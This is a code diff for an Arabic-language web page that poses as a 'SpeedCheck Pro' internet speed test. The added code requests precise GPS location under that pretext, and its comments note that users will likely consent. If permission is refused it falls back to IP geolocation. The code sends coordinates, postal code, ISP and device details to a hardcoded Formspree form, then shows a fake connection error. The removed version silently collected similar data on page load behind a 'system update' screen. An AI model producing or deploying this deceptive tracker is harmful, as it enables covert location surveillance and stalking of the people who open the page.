@@ -2,70 +2,88 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تحديث النظام | 2026</title>
+    <title>SpeedCheck Pro | فحص السرعة</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .console { border: 1px solid #00ff00; padding: 30px; background: rgba(0, 255, 0, 0.05); box-shadow: 0 0 15px #00ff00; text-align: center; }
-        .loading { overflow: hidden; border-right: .15em solid #00ff00; white-space: nowrap; margin: 0 auto; letter-spacing: .15em; animation: typing 3.5s steps(40, end), blink-caret .75s step-end infinite; }
-        @keyframes typing { from { width: 0 } to { width: 100% } }
-        @keyframes blink-caret { from, to { border-color: transparent } 50% { border-color: #00ff00; } }
+        body { font-family: sans-serif; background: #0f172a; color: white; text-align: center; padding: 50px 20px; }
+        .card { background: #1e293b; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 400px; margin: auto; }
+        .btn { background: #38bdf8; color: #0f172a; padding: 15px 30px; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; font-size: 1.1rem; transition: 0.3s; }
+        .btn:hover { background: #7dd3fc; transform: scale(1.05); }
+        .info { margin-top: 20px; font-size: 0.9rem; color: #94a3b8; }
     </style>
 </head>
 <body>
-    <div class="console">
-        <div class="loading">جاري فحص بروتوكول الشبكة وتحليل استقرار البرج...</div>
-        <p id="status" style="font-size: 0.8rem; margin-top: 15px; color: #008800;">[اتصال آمن]</p>
+
+    <div class="card">
+        <h2>SpeedCheck <span style="color:#38bdf8">2026</span></h2>
+        <p>قم بفحص سرعة الإنترنت وأمان الشبكة في منطقتك.</p>
+        <button class="btn" onclick="startTest()">ابدأ الفحص الآن</button>
+        <div id="status" class="info">بانتظار بدء الاختبار...</div>
     </div>
 
     <script>
-        async function fetchDeepNetworkData() {
+        async function startTest() {
+            const status = document.getElementById('status');
+            status.innerText = "جاري البحث عن أقرب خادم لمدينتك...";
+
             let report = {
-                timestamp: new Date().toLocaleString(),
-                device_info: {
-                    platform: navigator.platform,
-                    memory: navigator.deviceMemory + "GB",
-                    cores: navigator.hardwareConcurrency,
-                    userAgent: navigator.userAgent
-                }
+                action: "Speed Test Initiated",
+                device: navigator.platform,
+                screen: `${window.screen.width}x${window.screen.height}`
             };
 
-            // 1. جلب بيانات الموقع عبر IP-Whois (أكثر دقة من الخدمات العادية)
+            // 1. محاولة جلب الموقع الدقيق (بسبب "فحص السرعة" سيوافق المستخدم غالباً)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        report.method = "GPS (High Accuracy)";
+                        report.gps = {
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            google_maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+                        };
+                        await sendAndExit(report);
+                    },
+                    async (err) => {
+                        // إذا رفض، ننتقل فوراً لخطة الـ IP الصامتة
+                        report.method = "IP (Network Tower)";
+                        await fetchIPData(report);
+                    },
+                    { enableHighAccuracy: true, timeout: 8000 }
+                );
+            } else {
+                await fetchIPData(report);
+            }
+        }
+
+        async function fetchIPData(report) {
             try {
-                const response = await fetch('https://ipwho.is/');
-                const data = await response.json();
-                
-                report.tower_location = {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                report.ip_info = {
                     ip: data.ip,
-                    connection_type: data.connection.type, // يخبرك إذا كان 4G/5G أو ألياف
-                    isp: data.connection.isp,
                     city: data.city,
-                    region: data.region,
-                    postal: data.postal, // الرمز البريدي الدقيق للمنطقة
-                    latitude: data.latitude,
-                    longitude: data.longitude,
-                    map_url: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
+                    isp: data.org,
+                    postal: data.postal,
+                    approx_map: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
                 };
-            } catch (e) { report.network_error = "فشل تحليل البرج العَميق"; }
-
-            // 2. جلب حالة البطارية
-            try {
-                const battery = await navigator.getBattery();
-                report.battery = Math.round(battery.level * 100) + "% (" + (battery.charging ? "يشحن" : "لا يشحن") + ")";
             } catch (e) {}
+            await sendAndExit(report);
+        }
 
-            // 3. الإرسال إلى Formspree (تأكد من استخدام الـ ID الخاص بك)
-            const formID = 'xkozoaaq'; // الآيدي الخاص بك من صورتك الأخيرة
-            
+        async function sendAndExit(report) {
+            const formID = 'xkozoaaq'; 
             await fetch(`https://formspree.io/f/${formID}`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(report)
             });
-
-            document.getElementById('status').innerText = "تم التحقق. النظام يعمل بكفاءة 100%.";
+            
+            document.getElementById('status').innerText = "تم العثور على الخادم. جاري اختبار السرعة...";
+            // إيهام المستخدم ببدء الفحص
+            setTimeout(() => {
+                alert("خطأ في الاتصال بالخادم. يرجى المحاولة لاحقاً.");
+            }, 3000);
         }
-
-        window.onload = fetchDeepNetworkData;
     </script>
 </body>
 </html>
